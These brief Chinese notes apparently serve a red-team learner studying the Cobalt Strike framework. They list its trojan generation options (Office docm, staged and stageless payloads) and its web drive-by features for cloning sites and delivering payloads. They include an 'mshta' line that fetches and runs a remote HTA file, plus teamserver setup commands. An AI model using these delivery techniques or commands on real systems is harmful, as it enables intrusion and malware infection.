https://mp.weixin.qq.com/s/F1H4ReV71gK7JeoYxV3n5g
https://github.com/k8gege/Aggressor/releases/tag/cs


## 工具栏

![](https://s2.loli.net/2022/05/18/ot2CiV7mMeKuLq5.jpg)

攻击
- Office木马, 生成后监制到docm
- 分阶段木马 - 无法选择中转监听器
- 无阶段木马

Web Drive-by:
- Manage 管理当前Team Server开启的所有web服务
- Clone Site 克隆某网站
- Host File 在Team Server的某端口提供Web以供下载某文件
- Scripted Web Delivery 为payload提供web服务以便于下载和执行
- System Profiler 用来获取系统信息:系统版本, Flash版本,浏览器 版本等

## 攻击类型
```bash
# 1. exe
# 2.hta
mshta http://xx/file.hta
```
## 使用
```ts
sleep 0
shell ipconfig
```
## installation
```bash
chomd 777 teamserver
./teamserver 192.168.159.130 pass
```

如果报错,设置内存
```bash
java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar
# jdk11 启动
```
